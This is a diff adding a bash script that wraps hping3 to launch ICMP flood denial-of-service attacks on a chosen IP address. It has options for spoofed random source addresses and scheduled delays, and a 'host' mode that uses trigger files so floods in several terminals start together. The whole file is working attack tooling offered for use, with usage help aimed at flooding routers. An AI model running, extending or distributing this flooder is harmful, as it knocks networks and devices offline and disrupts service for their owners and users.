@@ -1,0 +1,117 @@
+#!/bin/bash
+function floodnow () {
+	if [ $toslp == 1 ]; then sleep $slp; fi
+	if [ "$addr" == 0 ]; then addr=$1; fi
+	if [ $rsource == 1 ]; then hping3 -1 --flood $addr --rand-source; else hping3 -1 --flood $addr; fi
+}
+
+function cmds () {
+	echo -e "\nflood: flood a device.\nWe will use 192.168.68.1 as the default address.\n"
+	
+	echo -e "To flood a router (for example 192.168.68.1), use\n>\tflood 192.168.68.1"
+	echo -e "Syntax:\n>\tflood <ip address>"
+	echo -e "To flood a router with random source, use\n>\tflood 192.168.68.1 with rand-source"
+	echo -e "Syntax:\n>\tflood <ip address> with <type>"
+	echo -e "To flood a router after 30 seconds, use \n>\tflood 192.168.68.1 after 30 seconds"
+	echo -e "You can also replace 'seconds' with 'minutes', 'hours' and 'days', such as\n>\tflood 192.168.68.1 after 43 minutes\n>\tflood 192.168.68.1 after 3 days"
+	echo -e "Syntax:\n>\tflood <ip address> after <int> (seconds/minutes/hours/days)"
+	echo -e "\nExamples:\n>\tFlood 192.168.68.1 with random source after 3 minutes\n\t>\tflood 192.168.68.1 with rand-source after 3 minutes\n\t>\tflood 192.168.68.1 after 3 minutes with rand-source"
+	echo -e "\t>\tflood <ip address> after <int> (seconds/minutes/hours/days) with <type>\n\t>\tflood <ip address> with <type> after <int> (seconds/minutes/hours/days)"
+	echo -e ">\tAll possible syntax:"
+	echo -e "\t>\tflood <ip address>\n\t>\tflood <ip address> after <int> (seconds/minutes/hours/days)\n\t>\tflood <ip address> with <type>\n\t>\tflood <ip address> with <type> after <int> (seconds/minutes/hours/days)"
+	echo -e "\t>\tflood <ip address> after <int> (seconds/minutes/hours/days) with <type>\n"
+	echo -e "Hint: You can replace <ip address> with 'default'.\nYou can change the default address by using echo command:\n>\techo 192.168.68.1 > /root/defaddr\nSyntax:\n>\techo <ip address> > /root/defaddr"
+	echo -e "To flood with multiple window, use 'flood host' in multiple terminals and follow the instructions."	
+}
+
+toslp=0
+rsource=0
+addr=0
+
+if [ "$1" == 'host' ]; then
+	echo setting up controller
+	touch /root/flood-trigger
+	touch /root/flood-ip
+	touch /root/flood-rsource
+	touch /root/flood-timeout
+	echo 0 > /root/flood-trigger
+	echo 192.168.68.1 > /root/flood-ip
+	echo 0 > /root/flood-rsource
+	echo 0s > /root/flood-timeout
+	echo Trigger: /root/flood-trigger
+	echo -e "\t(1) Start Flood"
+	echo Set Flood Target: /root/flood-ip
+	echo Toggle Flood Random Source: /root/flood-rsource
+	echo -e "\t(0) Disable\n\t(1) Enable"
+	echo Toggle Flood Timeout: /root/flood-timeout
+	echo -e "\t(0s) Disable"
+	echo -e "\t(!=0s) Enable\n"
+	echo -e "\nNow waiting for a flood trigger..."
+	while true; do
+		if [ "$(cat /root/flood-trigger)" == "1" ]; then
+			break
+		fi
+	done
+	if [ "$(cat /root/flood-timeout)" != "0s" ]; then
+		slp=$(cat /root/flood-timeout)
+	fi
+	rsource=$(cat /root/flood-rsource)
+	addr=$(cat /root/flood-ip)
+	floodnow
+fi
+
+
+touch /root/defaddr
+if [ "$(cat /root/defaddr)" == "" ]; then
+	echo 192.168.0.1 > /root/defaddr
+fi
+
+if [ "$1" == "help" ]; then
+	cmds
+	exit
+elif [ "$1" == "" ]; then
+	cmds
+	exit
+elif [ "$1" == "default" ]; then
+	addr=$(cat /root/defaddr) # DEFAULT ADDRESS
+fi
+
+if [ "$2" == "with" ]; then
+	if [ "$3" == "rand-source" ]; then
+		rsource=1
+		if [ "$4" == "after" ]; then
+			toslp=1
+			if [ "$6" == "seconds" ]; then
+				slp=$5s
+			elif [ "$6" == "minutes" ]; then
+				slp=$5m
+			elif [ "$6" == "hours" ]; then
+				slp=$5h
+			elif [ "$6" == "days" ]; then
+				slp=$5d
+			else
+				cmds
+				exit
+			fi
+		fi
+	else
+		cmds
+		exit
+	fi
+elif [ "$2" == "after" ]; then
+	toslp=1
+	if [ "$4" == "seconds" ]; then
+		slp=$3s
+	elif [ "$4" == "minutes" ]; then
+		slp=$3m
+	elif [ "$4" == "hours" ]; then
+		slp=$3h
+	elif [ "$4" == "days" ]; then
+		slp=$3d
+	else
+		cmds
+		exit
+	fi
+fi
+
+floodnow $1
